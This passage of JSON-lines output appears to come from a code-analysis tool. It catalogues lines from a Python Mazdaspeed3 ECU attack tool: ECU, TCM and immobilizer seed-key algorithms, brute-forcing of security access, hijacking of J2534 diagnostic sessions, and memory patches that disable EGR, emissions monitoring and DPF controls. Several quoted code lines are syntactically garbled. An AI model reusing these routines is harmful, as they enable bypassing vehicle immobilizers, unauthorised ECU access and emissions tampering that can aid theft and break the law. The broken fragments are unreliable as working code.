str) -> dict:"}, {"type": "security_pattern", "line": 77, "pattern": "decrypt", "content": "def decrypt_calibration_data(self, encrypted_package: str) -> dict:"}, {"type": "security_pattern", "line": 79, "pattern": "decrypt", "content": "Decrypt ECU calibration data with integrity verification"}, {"type": "security_pattern", "line": 83, "pattern": "encrypt", "content": "package_str = base64.urlsafe_b64decode(encrypted_package.encode()).decode()"}, {"type": "security_pattern", "line": 87, "pattern": "encrypt", "content": "encrypted_data = base64.urlsafe_b64decode(package['data'].encode())"}, {"type": "security_pattern", "line": 88, "pattern": "encrypt", "content": "decrypted_data = self.fernet.decrypt(encrypted_data).decode()"}, {"type": "security_pattern", "line": 88, "pattern": "decrypt", "content": "decrypted_data = self.fernet.decrypt(encrypted_data).decode()"}, {"type": "security_pattern", "line": 91, "pattern": "decrypt", "content": "integrity_hash = hashlib.sha256(decrypted_data.encode()).hexdigest()"}, {"type": "security_pattern", "line": 91, "pattern": "hash", "content": "integrity_hash = hashlib.sha256(decrypted_data.encode()).hexdigest()"}, {"type": "security_pattern", "line": 92, "pattern": "hash", "content": "if integrity_hash != package['integrity_hash']:"}, {"type": "security_pattern", "line": 96, "pattern": "decrypt", "content": "calibration_data = json.loads(decrypted_data)"}, {"type": "security_pattern", "line": 101, "pattern": "decrypt", "content": "raise SecurityError(f\"Calibration decryption failed: {e}\")"}, {"type": "security_pattern", "line": 114, "pattern": "key", "content": "self.master_key.encode(),"}, {"type": "security_pattern", "line": 116, "pattern": "hash", "content": "hashlib.sha256"}, {"type": "security_pattern", "line": 134, "pattern": "authorization", "content": "Verify vehicle signature for tuning file authorization"}, {"type": "security_pattern", "line": 153, "pattern": "key", "content": "self.master_key.encode(),"}, {"type": "security_pattern", "line": 155, "pattern": "hash", "content": "hashlib.sha256"}, {"type": "security_pattern", "line": 165, "pattern": "encrypt", "content": "Encrypt AI model files to protect intellectual property"}, {"type": "security_pattern", "line": 172, "pattern": "cipher", "content": "cipher = Cipher("}, {"type": "security_pattern", "line": 173, "pattern": "key", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 173, "pattern": "encrypt", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 177, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 177, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 180, "pattern": "encrypt", "content": "encrypted_model = encryptor.update(model_data) + encryptor.finalize()"}, {"type": "security_pattern", "line": 183, "pattern": "encrypt", "content": "protected_package = iv + encrypted_model"}, {"type": "security_pattern", "line": 192, "pattern": "decrypt", "content": "Decrypt AI model files"}, {"type": "security_pattern", "line": 197, "pattern": "encrypt", "content": "encrypted_model = protected_data[16:]"}, {"type": "security_pattern", "line": 200, "pattern": "cipher", "content": "cipher = Cipher("}, {"type": "security_pattern", "line": 201, "pattern": "key", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 201, "pattern": "encrypt", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 201, "pattern": "algorithm", "content": "algorithms.AES(self._derive_encryption_key(self.master_key)[:32]),"}, {"type": "security_pattern", "line": 205, "pattern": "decrypt", "content": "decryptor = cipher.decryptor()"}, {"type": "security_pattern", "line": 205, "pattern": "cipher", "content": "decryptor = cipher.decryptor()"}, {"type": "security_pattern", "line": 208, "pattern": "encrypt", "content": "model_data = decryptor.update(encrypted_model) + decryptor.finalize()"}, {"type": "security_pattern", "line": 208, "pattern": "decrypt", "content": "model_data = decryptor.update(encrypted_model) + decryptor.finalize()"}, {"type": "security_pattern", "line": 215, "pattern": "key", "content": "def secure_communication_channel(self, data: dict, session_key: str) -> str:"}, {"type": "security_pattern", "line": 224, "pattern": "key", "content": "session_fernet = Fernet(self._derive_encryption_key(session_key))"}, {"type": "security_pattern", "line": 224, "pattern": "encrypt", "content": "session_fernet = Fernet(self._derive_encryption_key(session_key))"}, {"type": "security_pattern", "line": 227, "pattern": "encrypt", "content": "encrypted_data = session_fernet.encrypt(data_str.encode())"}, {"type": "security_pattern", "line": 231, "pattern": "key", "content": "'session_id': hashlib.sha256(session_key.encode()).hexdigest()[:16],"}, {"type": "security_pattern", "line": 231, "pattern": "hash", "content": "'session_id': hashlib.sha256(session_key.encode()).hexdigest()[:16],"}, {"type": "security_pattern", "line": 232, "pattern": "encrypt", "content": "'data': base64.urlsafe_b64encode(encrypted_data).decode(),"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts", "security"]}
{"file_path": "muts1.py", "lines_read": 696, "features_found": [{"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "threading", "line": null}], "components_found": [], "algorithms": [{"type": "algorithm_function", "line": 50, "content": "def calculate_ecu_seed_key(self, seed: str) -> str:"}, {"type": "algorithm_function", "line": 71, "content": "def calculate_tcm_seed_key(self, seed: str) -> str:"}, {"type": "algorithm_function", "line": 86, "content": "def calculate_immobilizer_key(self, seed: str, vin: str) -> str:"}, {"type": "algorithm_function", "line": 101, "content": "def _derive_vin_key(self, vin: str) -> bytes:"}, {"type": "algorithm_function", "line": 128, "content": "def _try_algorithm_variation(self, seed_bytes: bytes, variation: int) -> bytes:"}], "protocols": [{"type": "protocol", "line": 39, "protocol": "CAN", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION\"\"\""}, {"type": "protocol", "line": 47, "protocol": "CAN", "content": "print(f\"CAN connection failed: {e}\")"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed_bytes[i] ^ 0x73"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed_bytes[i] ^ (0x73 + variation)) + i"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed_bytes[i] + (0x1F + variation)) ^ i"}, {"type": "protocol", "line": 141, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = ((seed_bytes[i] << (i + 1)) | (seed_bytes[i] >> (8 - i - 1))) & 0xFF"}, {"type": "protocol", "line": 144, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed_bytes[i] * (i + 2)) & 0xFF"}, {"type": "protocol", "line": 159, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x27)  # Security Access service"}, {"type": "protocol", "line": 160, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x02)  # Send key"}, {"type": "protocol", "line": 165, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x00)"}, {"type": "protocol", "line": 168, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 178, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response.data[0] == 0x67:  # Positive response"}, {"type": "protocol", "line": 214, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 215, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),"}, {"type": "protocol", "line": 224, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response.data[0] == 0x67:"}, {"type": "protocol", "line": 246, "protocol": "0x[0-9A-Fa-f]+", "content": "predicted_seed = (last_seed + seed_diff) & 0xFFFFFFFF"}, {"type": "protocol", "line": 251, "protocol": "J2534", "content": "HIJACK EXISTING J2534 DIAGNOSTIC SESSION"}, {"type": "protocol", "line": 279, "protocol": "0x[0-9A-Fa-f]+", "content": "if message and message.arbitration_id in [0x7E0, 0x7E1, 0x7E2]:"}, {"type": "protocol", "line": 291, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Tester present"}, {"type": "protocol", "line": 292, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Start extended session"}, {"type": "protocol", "line": 293, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Security access"}, {"type": "protocol", "line": 298, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 310, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 311, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x22, 0xF1, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Read VIN"}, {"type": "protocol", "line": 318, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x62"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x3D)  # Service ID"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x00)"}, {"type": "protocol", "line": 348, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 358, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x7D"}, {"type": "protocol", "line": 395, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 405, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x7F  # Special manufacturer response"}, {"type": "protocol", "line": 422, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.memory_patch_runtime(0xFFC200, b'\\x00' * 512)"}, {"type": "protocol", "line": 455, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.memory_patch_runtime(0xFFC000, b'\\x00' * 512)"}, {"type": "protocol", "line": 491, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.memory_patch_runtime(0xFFC500, b'\\x00' * 768)"}, {"type": "protocol", "line": 530, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xFFD100, b'\\x01'),  # Force regeneration flag"}, {"type": "protocol", "line": 531, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xFFD110, b'\\x00' * 4),  # Reset soot accumulation"}, {"type": "protocol", "line": 532, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xFFD120, b'\\xFF' * 2),  #  temperature checks"}, {"type": "protocol", "line": 550, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xFFD200, b'\\x00' * 8),  # Zero EGR flow targets"}, {"type": "protocol", "line": 551, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xFFD210, b'\\x00'),  # Disable EGR valve"}, {"type": "protocol", "line": 552, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xFFD220, b'\\xFF' * 4),  #  EGR monitoring"}, {"type": "protocol", "line": 569, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self..memory_patch_runtime(0xFFD300, b'\\x00' * 64)"}, {"type": "protocol", "line": 592, "protocol": "CAN", "content": "print(\"Failed to connect to CAN bus - using simulated mode\")"}, {"type": "protocol", "line": 663, "protocol": "0x[0-9A-Fa-f]+", "content": "boost_patch = .memory_patch_runtime(0xFFB000, b'\\x18')  # Set boost to 24 PSI"}, {"type": "protocol", "line": 667, "protocol": "0x[0-9A-Fa-f]+", "content": "revlimit_patch =.memory_patch_runtime(0xFFB800, b'\\x1C\\x20')  # Set rev limit to 7200 RPM"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "MAZDASPEED3_SECURITYN.py"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "COMPLETE SECURITY IMPLEMENTATION"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "class Security:"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "\"\"\"ACTUAL SECURITY  IMPLEMENTATIONS\"\"\""}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "class MazdaSecurity:"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "COMPLETE SECURITY ENGINE"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "self.security_level = 0"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "self.ecu_unlocked = False"}, {"type": "hardware", "line": 39, "hardware": "CAN bus", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION\"\"\""}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "def calculate_ecu_seed_key(self, seed: str) -> str:"}, {"type": "hardware", "line": 71, "hardware": "TCM", "content": "def calculate_tcm_seed_key(self, seed: str) -> str:"}, {"type": "hardware", "line": 73, "hardware": "TCM", "content": "IMPLEMENT TCM SIMPLE XOR ALGORITHM"}, {"type": "hardware", "line": 86, "hardware": "immobilizer", "content": "def calculate_immobilizer_key(self, seed: str, vin: str) -> str:"}, {"type": "hardware", "line": 88, "hardware": "immobilizer", "content": "IMPLEMENT IMMOBILIZER TRIPLE DES ALGORITHM"}, {"type": "hardware", "line": 91, "hardware": "vehicle", "content": "vehicle_key = self._derive_vin_key(vin)"}, {"type": "hardware", "line": 95, "hardware": "vehicle", "content": "cipher = Cipher(algorithms.TripleDES(vehicle_key), modes.ECB(), default_backend())"}, {"type": "hardware", "line": 102, "hardware": "immobilizer", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "hardware", "line": 107, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "hardware", "line": 123, "hardware": "ECU", "content": "if self.test_security_key(seed, test_key.hex()):"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "def test_security_key(self, seed: str, key: str) -> bool:"}, {"type": "hardware", "line": 150, "hardware": "ECU", "content": "TEST IF SECURITY KEY IS VALID"}, {"type": "hardware", "line": 151, "hardware": "ECU", "content": "Sends key to ECU and checks response"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "payload.append(0x27)  # Security Access service"}, {"type": "hardware", "line": 179, "hardware": "ECU", "content": "self.security_level = 3  # Highest access level"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "self.ecu_unlocked = True"}, {"type": "hardware", "line": 184, "hardware": "ECU", "content": "print(f\"Security key test failed: {e}\")"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "\"\"\"REQUEST SEED FROM ECU\"\"\""}, {"type": "hardware", "line": 293, "hardware": "ECU", "content": "bytes([0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Security access"}, {"type": "hardware", "line": 325, "hardware": "ECU", "content": "PATCH ECU MEMORY AT RUNTIME"}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "if not self.ecu_unlocked:"}, {"type": "hardware", "line": 329, "hardware": "ECU", "content": "print(\"ECU not unlocked - cannot patch memory\")"}, {"type": "hardware", "line": 380, "hardware": "ECU", "content": "self.security_level = 4  # Manufacturer level"}, {"type": "hardware", "line": 415, "hardware": "ECU", "content": "def __init__(self, security: MazdaSecurity):"}, {"type": "hardware", "line": 416, "hardware": "ECU", "content": "self. = security"}, {"type": "hardware", "line": 427, "hardware": "ECU", "content": "self._execute_fuel_relearn()"}, {"type": "hardware", "line": 435, "hardware": "ECU", "content": "def _execute_fuel_relearn(self):"}, {"type": "hardware", "line": 436, "hardware": "ECU", "content": "\"\"\"EXECUTE FUEL SYSTEM RELEARN PROCEDURE\"\"\""}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "self._execute_knock_relearn()"}, {"type": "hardware", "line": 467, "hardware": "ECU", "content": "def _execute_knock_relearn(self):"}, {"type": "hardware", "line": 468, "hardware": "ECU", "content": "\"\"\"EXECUTE KNOCK SENSOR RELEARN PROCEDURE\"\"\""}, {"type": "hardware", "line": 482, "hardware": "TCM", "content": "def reset_tcm_adaptation(self) -> bool:"}, {"type": "hardware", "line": 486, "hardware": "TCM", "content": "tcm_seed = self.request_seed()  # This would need TCM-specific implementation"}, {"type": "hardware", "line": 487, "hardware": "TCM", "content": "if tcm_seed:"}, {"type": "hardware", "line": 488, "hardware": "TCM", "content": "tcm_key = selfcalculate_tcm_seed_key(tcm_seed)"}, {"type": "hardware", "line": 489, "hardware": "ECU", "content": "if self.test_security_key(tcm_seed, tcm_key):"}, {"type": "hardware", "line": 489, "hardware": "TCM", "content": "if self.test_security_key(tcm_seed, tcm_key):"}, {"type": "hardware", "line": 494, "hardware": "TCM", "content": "print(\"TCM adaptation reset successfully\")"}, {"type": "hardware", "line": 495, "hardware": "ECU", "content": "self._execute_tcm_relearn()"}, {"type": "hardware", "line": 495, "hardware": "TCM", "content": "self._execute_tcm_relearn()"}, {"type": "hardware", "line": 499, "hardware": "TCM", "content": "print(f\"TCM adaptation reset failed: {e}\")"}, {"type": "hardware", "line": 503, "hardware": "ECU", "content": "def _execute_tcm_relearn(self):"}, {"type": "hardware", "line": 503, "hardware": "TCM", "content": "def _execute_tcm_relearn(self):"}, {"type": "hardware", "line": 504, "hardware": "ECU", "content": "\"\"\"EXECUTE TCM RELEARN PROCEDURE\"\"\""}, {"type": "hardware", "line": 504, "hardware": "TCM", "content": "\"\"\"EXECUTE TCM RELEARN PROCEDURE\"\"\""}, {"type": "hardware", "line": 505, "hardware": "TCM", "content": "print(\"Initiating TCM relearn procedure...\")"}, {"type": "hardware", "line": 511, "hardware": "TCM", "content": "\"5. TCM relearn complete\""}, {"type": "hardware", "line": 522, "hardware": "ECU", "content": "def __init__(self, security: MazdaSecurity):"}, {"type": "hardware", "line": 523, "hardware": "ECU", "content": "self. = security_"}, {"type": "hardware", "line": 581, "hardware": "ECU", "content": "def demonstrate_security_():"}, {"type": "hardware", "line": 583, "hardware": "ECU", "content": "DEMONSTRATE COMPLETE SECURITY  CAPABILITIES"}, {"type": "hardware", "line": 585, "hardware": "ECU", "content": "print(\"MAZDASPEED 3 SECURITY  DEMONSTRATION\")"}, {"type": "hardware", "line": 589, "hardware": "ECU", "content": "= MazdaSecurity()"}, {"type": "hardware", "line": 592, "hardware": "CAN bus", "content": "print(\"Failed to connect to CAN bus - using simulated mode\")"}, {"type": "hardware", "line": 602, "hardware": "ECU", "content": "ecu_key = .calculate_ecu_seed_key(test_seed)"}, {"type": "hardware", "line": 603, "hardware": "TCM", "content": "tcm_key = .calculate_tcm_seed_key(\"1A2B\")"}, {"type": "hardware", "line": 605, "hardware": "ECU", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "hardware", "line": 606, "hardware": "TCM", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}, {"type": "hardware", "line": 615, "hardware": "ECU", "content": "print(\"\\n2. SECURITY  METHODS\")"}, {"type": "hardware", "line": 641, "hardware": "TCM", "content": "tcm_reset = reset_manager.reset_tcm_adaptation()"}, {"type": "hardware", "line": 642, "hardware": "TCM", "content": "print(f\"TCM adaptation reset: {'SUCCESS' if tcm_reset else 'FAILED'}\")"}, {"type": "hardware", "line": 678, "hardware": "ECU", "content": "print(\"SECURITY CAPABILITIES VERIFIED\")"}, {"type": "hardware", "line": 683, "hardware": "ECU", "content": "'ecu_security': 'COMPROMISED' if.ecu_unlocked else 'PARTIAL',"}, {"type": "hardware", "line": 684, "hardware": "ECU", "content": "'security_level': .security_level,"}, {"type": "hardware", "line": 688, "hardware": "ECU", "content": "'session_security': 'VULNERABLE'"}, {"type": "hardware", "line": 691, "hardware": "ECU", "content": "print(\"\\nSECURITY ASSESSMENT:\")"}, {"type": "hardware", "line": 696, "hardware": "ECU", "content": "demonstrate_security_()"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 14, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 14, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 21, "pattern": "seed", "content": "seed: str"}, {"type": "security_pattern", "line": 22, "pattern": "algorithm", "content": "algorithm: str"}, {"type": "security_pattern", "line": 23, "pattern": "key", "content": "calculated_key: str"}, {"type": "security_pattern", "line": 29, "pattern": "key", "content": "Implements all seed-key algorithms and methods"}, {"type": "security_pattern", "line": 29, "pattern": "seed", "content": "Implements all seed-key algorithms and methods"}, {"type": "security_pattern", "line": 29, "pattern": "algorithm", "content": "Implements all seed-key algorithms and methods"}, {"type": "security_pattern", "line": 50, "pattern": "key", "content": "def calculate_ecu_seed_key(self, seed: str) -> str:"}, {"type": "security_pattern", "line": 50, "pattern": "seed", "content": "def calculate_ecu_seed_key(self, seed: str) -> str:"}, {"type": "security_pattern", "line": 52, "pattern": "algorithm", "content": "IMPLEMENT MAZDA M12R v3.4 ALGORITHM"}, {"type": "security_pattern", "line": 55, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 56, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 61, "pattern": "seed", "content": "temp = seed_bytes[i] ^ 0x73"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 69, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "def calculate_tcm_seed_key(self, seed: str) -> str:"}, {"type": "security_pattern", "line": 71, "pattern": "seed", "content": "def calculate_tcm_seed_key(self, seed: str) -> str:"}, {"type": "security_pattern", "line": 73, "pattern": "algorithm", "content": "IMPLEMENT TCM SIMPLE XOR ALGORITHM"}, {"type": "security_pattern", "line": 75, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 76, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 79, "pattern": "key", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 79, "pattern": "seed", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 80, "pattern": "seed", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 81, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 82, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 84, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 86, "pattern": "key", "content": "def calculate_immobilizer_key(self, seed: str, vin: str) -> str:"}, {"type": "security_pattern", "line": 86, "pattern": "seed", "content": "def calculate_immobilizer_key(self, seed: str, vin: str) -> str:"}, {"type": "security_pattern", "line": 88, "pattern": "algorithm", "content": "IMPLEMENT IMMOBILIZER TRIPLE DES ALGORITHM"}, {"type": "security_pattern", "line": 91, "pattern": "key", "content": "vehicle_key = self._derive_vin_key(vin)"}, {"type": "security_pattern", "line": 92, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 95, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(vehicle_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 95, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(vehicle_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 95, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(vehicle_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 96, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 96, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 97, "pattern": "key", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 97, "pattern": "encrypt", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 97, "pattern": "seed", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 99, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 101, "pattern": "key", "content": "def _derive_vin_key(self, vin: str) -> bytes:"}, {"type": "security_pattern", "line": 102, "pattern": "key", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "security_pattern", "line": 106, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 106, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 107, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 107, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 109, "pattern": "key", "content": "return key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 111, "pattern": "key", "content": "def brute_force_seed_key(self, seed: str, max_attempts: int = 65536) -> Optional[str]:"}, {"type": "security_pattern", "line": 111, "pattern": "seed", "content": "def brute_force_seed_key(self, seed: str, max_attempts: int = 65536) -> Optional[str]:"}, {"type": "security_pattern", "line": 113, "pattern": "key", "content": "BRUTE FORCE SEED-KEY COMBINATIONS"}, {"type": "security_pattern", "line": 113, "pattern": "seed", "content": "BRUTE FORCE SEED-KEY COMBINATIONS"}, {"type": "security_pattern", "line": 114, "pattern": "algorithm", "content": "For weak algorithms or unknown implementations"}, {"type": "security_pattern", "line": 116, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 120, "pattern": "key", "content": "test_key = self._try_algorithm_variation(seed_bytes, attempt)"}, {"type": "security_pattern", "line": 120, "pattern": "seed", "content": "test_key = self._try_algorithm_variation(seed_bytes, attempt)"}, {"type": "security_pattern", "line": 120, "pattern": "algorithm", "content": "test_key = self._try_algorithm_variation(seed_bytes, attempt)"}, {"type": "security_pattern", "line": 123, "pattern": "key", "content": "if self.test_security_key(seed, test_key.hex()):"}, {"type": "security_pattern", "line": 123, "pattern": "seed", "content": "if self.test_security_key(seed, test_key.hex()):"}, {"type": "security_pattern", "line": 124, "pattern": "key", "content": "return test_key.hex()"}, {"type": "security_pattern", "line": 128, "pattern": "seed", "content": "def _try_algorithm_variation(self, seed_bytes: bytes, variation: int) -> bytes:"}, {"type": "security_pattern", "line": 128, "pattern": "algorithm", "content": "def _try_algorithm_variation(self, seed_bytes: bytes, variation: int) -> bytes:"}, {"type": "security_pattern", "line": 129, "pattern": "algorithm", "content": "\"\"\"TRY DIFFERENT ALGORITHM VARIATIONS FOR BRUTE FORCE\"\"\""}, {"type": "security_pattern", "line": 130, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 135, "pattern": "key", "content": "key[i] = (seed_bytes[i] ^ (0x73 + variation)) + i"}, {"type": "security_pattern", "line": 135, "pattern": "seed", "content": "key[i] = (seed_bytes[i] ^ (0x73 + variation)) + i"}, {"type": "security_pattern", "line": 138, "pattern": "key", "content": "key[i] = (seed_bytes[i] + (0x1F + variation)) ^ i"}, {"type": "security_pattern", "line": 138, "pattern": "seed", "content": "key[i] = (seed_bytes[i] + (0x1F + variation)) ^ i"}, {"type": "security_pattern", "line": 141, "pattern": "key", "content": "key[i] = ((seed_bytes[i] << (i + 1)) | (seed_bytes[i] >> (8 - i - 1))) & 0xFF"}, {"type": "security_pattern", "line": 141, "pattern": "seed", "content": "key[i] = ((seed_bytes[i] << (i + 1)) | (seed_bytes[i] >> (8 - i - 1))) & 0xFF"}, {"type": "security_pattern", "line": 144, "pattern": "key", "content": "key[i] = (seed_bytes[i] * (i + 2)) & 0xFF"}, {"type": "security_pattern", "line": 144, "pattern": "seed", "content": "key[i] = (seed_bytes[i] * (i + 2)) & 0xFF"}, {"type": "security_pattern", "line": 146, "pattern": "key", "content": "return bytes(key)"}, 